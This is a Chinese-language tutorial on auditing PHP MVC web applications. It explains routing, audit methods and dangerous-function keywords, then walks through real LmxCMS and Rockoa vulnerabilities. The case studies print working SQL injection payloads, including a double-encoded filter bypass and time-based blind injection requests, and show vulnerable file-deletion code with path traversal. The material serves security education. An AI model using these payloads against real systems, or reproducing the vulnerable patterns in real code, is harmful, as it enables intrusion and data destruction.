@@ -1,0 +1,155 @@
+在Web应用开发中，MVC（Model-View-Controller）模式已成为主流的架构设计。它将业务逻辑、数据、界面显示分离，提高了代码的可维护性和可扩展性。然而，对于代码审计而言，MVC架构既带来了便利，也引入了新的挑战。如何在高楼林立的MVC代码中快速定位漏洞？如何利用MVC的分层特性精准分析安全问题？本文将从MVC基础出发，结合多个真实漏洞案例，深入探讨MVC架构下的代码审计方法论与实践技巧。
+
+---
+
+一、MVC架构基础与安全影响
+
+1. MVC流程与各层职能
+
+MVC模式将Web应用划分为三个核心组件：
+
+· 控制器（Controller）：截获用户请求，调用模型处理业务，并选择合适的视图展示结果。它是用户交互的入口。
+· 模型（Model）：管理业务逻辑和数据库操作，提供数据抽象层，负责与数据库交互。
+· 视图（View）：负责前端模版渲染，将数据以HTML等形式呈现给用户。
+
+典型的MVC请求流程如下：
+
+1. Controller 截获用户请求；
+2. Controller 调用 Model 完成数据读写；
+3. Controller 将数据传递给 View；
+4. View 渲染最终结果并呈现给用户。
+
+2. MVC对代码审计的主要影响
+
+· 文件代码定位问题：MVC将代码分散在控制器、模型、视图目录中，审计时需根据URL路由快速定位对应的控制器文件。
+· 代码过滤分析问题：全局过滤可能定义在入口文件或配置文件中，而控制器中可能单独处理输入，需要理清过滤链。
+· 前端安全发现问题：视图层常存在XSS、SSTI等漏洞，需关注模板渲染方式及数据输出前的过滤。
+
+---
+
+二、代码审计方法论：从入口到深入
+
+1. 通用审计入口
+
+· 搜索法：利用常见漏洞关键字（如SQL注入的select、mysql_query，文件操作的unlink）在代码库中全局搜索，快速定位可疑代码段。
+· 功能法：以用户功能点为入口，通过抓包分析请求参数，追踪代码执行流程。适用于框架规范的项目。
+· 对比法：对比前后版本修复的代码差异，挖掘未公开的漏洞。
+· 特征法：监控特定操作（如文件上传、删除）的代码特征，结合动态分析发现漏洞。
+· 工具法：借助SAST、IAST、DAST等工具辅助审计，但需人工验证。
+· 调试法：动态插桩调试，观察变量流向和过滤效果。
+
+2. MVC审计流程
+
+· 搞清URL路由对应关系：解析URL参数（如?m=模块&a=方法&d=目录）如何映射到具体的控制器文件和方法。
+· 搞清核心配置文件：寻找全局过滤、数据库配置、错误处理等关键配置。
+· 搞清是否为开发框架：如ThinkPHP、Yii等框架有自身的安全机制，审计需结合框架特性。
+
+---
+
+三、PHP常见漏洞关键字速查
+
+审计时需重点关注以下函数及操作：
+
+漏洞类型 关键字/函数
+SQL注入 select, insert, update, delete, mysql_query, mysqli_query, PDO::query
+文件上传 $_FILES, move_uploaded_file, is_uploaded_file, type="file"
+XSS print, print_r, echo, sprintf, die, var_dump, var_export
+文件包含 include, include_once, require, require_once
+代码执行 eval, assert, preg_replace('/e'), call_user_func, call_user_func_array
+命令执行 system, exec, shell_exec, ``, passthru, pcntl_exec, popen, proc_open
+变量覆盖 extract(), parse_str(), import_request_variables(), $$
+反序列化 serialize(), unserialize(), __destruct, __wakeup
+其他 unlink(), file_get_contents(), show_source(), file(), fopen()
+
+此外，$_GET、$_POST、$_REQUEST、$_FILES等超全局变量是数据输入的源头，需关注其过滤情况。
+
+---
+
+四、实战案例分析：非框架MVC下的漏洞挖掘
+
+以下案例均来自真实漏洞，展示了如何在非框架MVC代码中利用上述方法论定位漏洞。
+
+1. LmxCMS SQL注入（CNVD-2023-98192）
+
+漏洞定位：通过搜索关键字select或功能点“标签查询”定位到/index.php?m=Tags对应的控制器文件。
+路由解析：m=Tags表示调用Tags控制器。
+漏洞代码：在Tags控制器中，$name参数直接拼接进入SQL查询，但存在一次全局过滤函数filter_sql。
+绕过思路：开发者对输入进行了filter_sql过滤（如转义单引号），但入口处可能先进行了urldecode。攻击者通过两次URL编码，使参数在解码后仍包含恶意字符，从而绕过过滤。
+Payload示例：
+
+```
+/index.php?m=Tags&name=%2531%2527%2520%2561%256e%2564%2520%2575%2570%2564%2561%2574%2565%2578%256d%256c%2528%2530%252c%2563%256f%256e%2563%2561%2574%2528%2530%2578%2537%2565%252c%2575%2573%2565%2572%2528%2529%2529%252c%2531%2529%2523
+```
+
+解码后为：1' and updatexml(0,concat(0x7e,user()),1)#，成功执行报错注入。
+
+2. LmxCMS 文件安全（任意文件删除，CNVD-2020-59469）
+
+漏洞定位：
+
+· 搜索法：搜索关键字unlink，发现delbackdb()函数调用了unlink。
+· 功能法：后台“数据库备份删除”功能对应admin.php?m=backdb&a=delbackdb，参数filename直接传入unlink。
+  漏洞代码：
+
+```php
+// BackdbAction.class.php
+public function delbackdb(){
+    $filename = $_GET['filename'];
+    unlink($filename);  // 未检查路径，导致任意文件删除
+}
+```
+
+攻击者可通过filename=../../1.txt删除任意文件。
+
+3. Rockoa SQL注入（一）—— 基于insert的注入
+
+环境搭建：Rockoa是一款开源OA系统，URL路由规则：m=模块|目录&d=外层目录&a=方法。
+漏洞定位：搜索insert关键字，发现opendkqAction.php中的addkqjs()方法调用了senddata()，最终进入zktimeAction.php的zktimeAction方法。
+路由对应：/index.php?m=opendkq|openapi&d=task&a=zktime。
+漏洞代码：zktimeAction方法接收JSON数据，将sn字段直接拼接到insert语句中，未做过滤。
+Payload：
+
+```
+POST /index.php?m=opendkq|openapi&d=task&a=zktime HTTP/1.1
+Host: 192.168.1.4:89
+Content-Type: application/json
+
+{"xxx":{"sn":"123' and sleep(0)#"}}
+```
+
+注入导致时间延迟，验证漏洞存在。
+
+4. Rockoa SQL注入（二）—— 基于select的注入
+
+漏洞定位：搜索select关键字，定位到openbaseAction.php中的querydata方法。
+路由对应：/index.php?m=openbase|openapi&d=task&a=querydata。
+漏洞代码：getuserid()方法中，basemodenum参数未经处理直接拼接SQL语句。
+Payload：
+
+```
+POST /index.php?m=openbase|openapi&d=task&a=querydata HTTP/1.1
+Content-Type: application/json
+
+{"baseoptid":"1","basemodenum":"xxx' OR SLEEP(0.04)#"}
+```
+
+通过闭合SQL语句，实现基于时间的盲注。
+
+---
+
+五、审计要点总结与建议
+
+1. 路由解析是关键：非框架MVC通常通过参数（如m、a）映射文件和方法，审计前必须分析URL路由规则，才能精准定位代码。
+2. 全局过滤需警惕：开发者可能在入口处统一过滤，但若过滤函数存在缺陷（如解码顺序不当），则可能被绕过。需追踪输入流的完整路径。
+3. 关注视图层安全：视图文件中的echo、模版变量输出若无适当转义，易导致XSS或SSTI。检查模板引擎配置及变量输出方式。
+4. 对比历史版本：通过CNVD等漏洞库查找目标CMS的已公开漏洞，对比修复版本，往往能发现相似的漏洞模式。
+5. 动态调试辅助：在复杂逻辑中，动态插桩可直观观察变量变化，验证过滤是否生效。
+
+MVC架构的清晰分层为代码审计提供了便利，但也要求审计者具备“路由思维”和“分层思维”。只有将理论方法与实战技巧相结合，才能高效挖掘深层次的安全漏洞。
+
+---
+
+参考文献：
+
+· CNVD漏洞库：CNVD-2023-98192, CNVD-2019-05674, CNVD-2020-59469
+· 先知社区：Rockoa SQL注入分析文章
